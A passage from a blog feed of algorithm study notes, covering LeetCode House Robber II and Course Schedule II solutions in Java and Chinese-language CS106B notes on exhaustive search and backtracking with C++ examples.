        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Divide and Conquer </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[213. House Robber II]]></title>
      <url>/wiki/2017/10/30/Leetcode-213-House-Robber-II/</url>
      <content type="html"><![CDATA[<p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are <strong>arranged in a circle</strong>. That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have security system connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p>
<p>Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight <strong>without alerting the police</strong>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,3,2]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: You cannot rob house 1 (money = 2) and then rob house 3 (money = 2),</span><br><span class="line">             because they are adjacent houses.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3,1]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).</span><br><span class="line">             Total amount you can rob = 1 + 3 = 4.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 198. House Robber的延伸，既然已经知道了House Robber怎么写的，那么就可以把这道题目分解了。由于房子是圆形排列的，因此，不能同时抢首尾的房子，也就是说有两种抢法：0~last-1和1~last。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> Math.max(rob(nums, <span class="number">1</span>, n), rob(nums, <span class="number">0</span>, n - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> last = <span class="number">0</span>, secondLast = <span class="number">0</span>, cur = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        cur = Math.max(nums[i] + secondLast, last);</span><br><span class="line">        secondLast = last;</span><br><span class="line">        last = cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cur;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[210. Course Schedule II]]></title>
      <url>/wiki/2017/10/30/Leetcode-210-Course-Schedule-II/</url>
      <content type="html"><![CDATA[<p>There are a total of $n$ courses you have to take, labeled from 0 to $n-1$.</p>
<p>Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: <code>[0,1]</code></p>
<p>Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.</p>
<p>There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: 2, [[1,0]] </span><br><span class="line">Output: [0,1]</span><br><span class="line">Explanation: There are a total of 2 courses to take. </span><br><span class="line">    To take course 1 you should have finished course 0.</span><br><span class="line">    So the correct course order is [0,1].</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: 4, [[1,0],[2,0],[3,1],[3,2]]</span><br><span class="line">Output: [0,1,2,3] or [0,2,1,3]</span><br><span class="line">Explanation: There are a total of 4 courses to take. </span><br><span class="line">    To take course 3 you should have finished both courses 1 and 2. </span><br><span class="line">    Both courses 1 and 2 should be taken after you finished course 0.  </span><br><span class="line">    So one correct course order is [0,1,2,3]. </span><br><span class="line">    Another correct ordering is [0,2,1,3] .</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ol>
<li>The input prerequisites is a graph represented by a list of edges, not adjacency matrices. </li>
<li>You may assume that there are no duplicate edges in the input prerequisites.</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这题意思非常简单：给出上课顺序。这道题目是207. Course Schedule的延伸，前者只需要判断所有课程是否可以完成，现在需要给出完成的顺序。那么第一步肯定是用dfs来判断课程是否可以完成，那么怎么给出顺序呢？拓扑排序。有先决条件限制的规划问题(precedence-constrained scheduling problem)是拓扑排序的典型应用。拓扑排序其实就是dfs后序的逆序(reverse postOrder)。所以可以将拓扑排序和环的判断同时进行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> hasCycle;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] findOrder(<span class="keyword">int</span> numCourses, <span class="keyword">int</span>[][] prerequisites) &#123;</span><br><span class="line">    hasCycle = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// construct a graph</span></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; graph = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses; i++)</span><br><span class="line">        graph.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] prerequisite : prerequisites)</span><br><span class="line">        graph.get(prerequisite[<span class="number">1</span>]).add(prerequisite[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// dfs</span></span><br><span class="line">    <span class="keyword">boolean</span>[] mark = <span class="keyword">new</span> <span class="keyword">boolean</span>[numCourses];</span><br><span class="line">    <span class="keyword">boolean</span>[] onStack = <span class="keyword">new</span> <span class="keyword">boolean</span>[numCourses];</span><br><span class="line">    List&lt;Integer&gt; postOrder = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">0</span>; v &lt; numCourses; v++)</span><br><span class="line">        <span class="keyword">if</span> (!hasCycle &amp; !mark[v]) </span><br><span class="line">            dfs(graph, mark, onStack, postOrder, v);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// impossible to finish all course</span></span><br><span class="line">    <span class="keyword">if</span> (hasCycle) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">    <span class="comment">// get reversePostOrder</span></span><br><span class="line">    <span class="keyword">int</span> [] reverePostOrder = <span class="keyword">new</span> <span class="keyword">int</span>[numCourses];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses; i++)</span><br><span class="line">        reverePostOrder[i] = postOrder.get(numCourses - i - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> reverePostOrder;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; graph, <span class="keyword">boolean</span>[] mark,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">boolean</span>[] onStack, List&lt;Integer&gt; postOrder, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    mark[v] = <span class="keyword">true</span>;</span><br><span class="line">    onStack[v] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> w : graph.get(v)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!hasCycle &amp; !mark[w])</span><br><span class="line">            dfs(graph, mark, onStack, postOrder, w);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (onStack[w]) hasCycle = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    onStack[v] = <span class="keyword">false</span>;</span><br><span class="line">    postOrder.add(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Graph </tag>
            
            <tag> Topological Sort </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Exhaustive Search and Backtracking]]></title>
      <url>/wiki/2017/10/30/Algorithm-Backtracking/</url>
      <content type="html"><![CDATA[<p>来自Stanford CS106B Lecture 9/10/11 -  Exhaustive Search and Backtracking (winter 2018)的学习笔记。</p>
<p><a href="https://www.youtube.com/watch?v=Frr8U5_TTtg&amp;t=296s">视频地址</a></p>
<h2 id="1-Exhaustive-search"><a href="#1-Exhaustive-search" class="headerlink" title="1. Exhaustive search"></a>1. Exhaustive search</h2><p><strong>exhaustive search</strong>(穷举搜索): Exploring every possible combination from a set of choices or values.</p>
<ul>
<li>often implemented recursively</li>
</ul>
<p>Applications</p>
<ul>
<li>producing all permutations of a set of values</li>
<li>enumerating all possible names, passwords, etc.</li>
<li>combinatorics and logic programming.</li>
</ul>
<p>Often the search space consists of many <strong>decisions</strong>, each has several available <strong>choices</strong>.</p>
<ul>
<li>Example: When enumerating all 5-letter strings, each of the 5 letters is a <em>decision</em>, and each of those decisions has 26 possible <em>choice</em>.</li>
</ul>
<p>A general pseudo-code algorithm for exhaustive search:</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/exhaustive search.png" alt="exhaustive search"></p>
<h3 id="Example-printAllBinary"><a href="#Example-printAllBinary" class="headerlink" title="Example- printAllBinary"></a>Example- printAllBinary</h3><p>Write a recursive function printAllBinary that accepts an integer number of digits and prints all binary numbers that have exactly that many digits, in ascending order, one per line.</p>
<p>打印出所有n位二进制数字。使用递归法，注意basecase。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printAllBinaryHelper</span><span class="params">(<span class="keyword">int</span> digits, <span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (digits == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">// base case: print the string we have buitl</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		printAllBinaryHelper(digits <span class="number">-1</span>, s+<span class="string">"0"</span>);</span><br><span class="line">		printAllBinaryHelper(digits <span class="number">-1</span>, s+<span class="string">"1"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printAllBinary</span><span class="params">(<span class="keyword">int</span> digits)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	printAllBinaryHelper(digits, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> digits = <span class="number">3</span>;</span><br><span class="line">	printAllBinary(digits);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类似的，对于10进制数字，有</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printDecimalHelper</span><span class="params">(<span class="keyword">int</span> digits, <span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (digits == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">            printDecimalHelper(digits<span class="number">-1</span>, s+to_string(i));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printDecimal</span><span class="params">(<span class="keyword">int</span> digits)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    printDecimalHelper(digits, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    printDecimal(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-Backtracking"><a href="#2-Backtracking" class="headerlink" title="2. Backtracking"></a>2. Backtracking</h2><p><strong>backtracking</strong>: Finding solution(s) by trying partial solutions and then abandoning them if they are not suitable.</p>
<ul>
<li>a “brute force” algorithmic technique (tries all paths)</li>
<li>often implemented recursively</li>
</ul>
<p>Applications:</p>
<ul>
<li>producing all permutations of a set of values</li>
<li>parsing languages</li>
<li>games: anagrams, crosswords, word jumbles</li>
<li>combinatorics and logic programming</li>
<li>escaping from a maze</li>
</ul>
<p>A general pseudo-code algorithm for backtracking</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/backtracking.png" alt="backtracking"></p>
<ul>
<li><p>Key tasks:</p>
<ul>
<li>Figure out appropriate smallest unit of work (decision)</li>
<li>Figure out how to enumerate all possible choices/options for it.</li>
</ul>
</li>
</ul>
<h3 id="Example-Dice-Roll-Sum"><a href="#Example-Dice-Roll-Sum" class="headerlink" title="Example- Dice Roll Sum"></a>Example- Dice Roll Sum</h3><p><strong>Dice Roll Sum</strong>: Write a function <code>diceSum</code> that accepts two integer parameters: a number of dice to roll, and a desired sum of all die values. Output all combinations of die values that add up to exactly that sum.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/die_sum.png" alt="die_sum"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  * prints all possible outcomes of rolling the given</span></span><br><span class="line"><span class="comment">  * number of six-sided dice that add up to exactly the given</span></span><br><span class="line"><span class="comment">  * desired sum, in &#123;#, #, #&#125; format.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diceSumHelper</span><span class="params">(<span class="keyword">int</span> dice, <span class="keyword">int</span> desiredSum, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; chosen)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*cout &lt;&lt; resursionIndent() &lt;&lt; "diceSum(" &lt;&lt; dice &lt;&lt; ", " &lt;&lt; desiredSum</span></span><br><span class="line"><span class="comment">         &lt;&lt; ", " &lt;&lt; chosen &lt;&lt; ")" &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (dice == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span> (desiredSum==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// base case</span></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#123;"</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; chosen.size()<span class="number">-1</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; chosen[i] &lt;&lt; <span class="string">","</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; chosen[chosen.size()<span class="number">-1</span>] &lt;&lt;  <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i= <span class="number">1</span>; i&lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// choose i </span></span><br><span class="line">            chosen.push_back(i);</span><br><span class="line">            <span class="comment">// explore what could follow that</span></span><br><span class="line">            diceSumHelper(dice<span class="number">-1</span>, desiredSum-i, chosen);</span><br><span class="line">            <span class="comment">// un-choose i</span></span><br><span class="line">            chosen.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diceSum</span><span class="params">(<span class="keyword">int</span> dice, <span class="keyword">int</span> desiredSum)</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">    diceSumHelper(dice, desiredSum, v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"diceSum:"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    diceSum(<span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://or9a8nskt.bkt.clouddn.com/die_decision-tree.png" alt="die_decision-tree"></p>
<p>但这并不是非常好的一个解决方案。It checks every possibility. 所以可以加上一些限制条件。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (desiredSum &gt;= dice*<span class="number">1</span> &amp;&amp; desiredSum &lt;= dice*<span class="number">6</span>)&#123;</span><br><span class="line">    ...todo something</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Example-Escape-Maze"><a href="#Example-Escape-Maze" class="headerlink" title="Example - Escape Maze"></a>Example - Escape Maze</h3><p>Write a function escapeMaze(maze, row, col) that searches for a path out of a given 2-dimensional maze.</p>
<ul>
<li>Return true if able to escape, or false if not.</li>
<li>“Escaping” means exiting the maze boundaries.</li>
<li>You can move 1 square at a time in any of the 4 directions</li>
<li>“Mark” your path along the way.</li>
<li>“Taint” bad paths that do not work.</li>
<li>Do not explore the same path twice.</li>
</ul>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15430453679609.png?imageslim" alt=""></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">escapeMaze</span><span class="params">(Maze&amp; maze, <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//base case</span></span><br><span class="line">    <span class="keyword">if</span>(!maze.inBounds(row, col))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(maze.isWall(row, col))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (maze.isOpen(row, col))&#123;</span><br><span class="line">        <span class="comment">//choose</span></span><br><span class="line">        maze.mark(row, col);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> result = escapeMaze(maze, row + <span class="number">1</span>, col)</span><br><span class="line">            || escapeMaze(maze, row, col + <span class="number">1</span>) </span><br><span class="line">            || escapeMaze(maze, row, col - <span class="number">1</span>) </span><br><span class="line">            || escapeMaze(maze, row - <span class="number">1</span>, col))&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//un-choose</span></span><br><span class="line">        <span class="keyword">if</span> (!result)&#123;</span><br><span class="line">            maze.taint(row, col);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Example-Permute-Vector"><a href="#Example-Permute-Vector" class="headerlink" title="Example - Permute Vector"></a>Example - Permute Vector</h3><p>Write a function <strong>permute</strong> that accepts a Vector of strings as a parameter and outputs all possible rearrangements of the strings in that vector. The arrangements may be output in any order.</p>
<ul>
<li>Example: if v contains { “a”, “b”, “c”, “d”}, you function outputs these permutations:</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/permuate_vector_demo.png" alt="permuate_vector_demo"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> 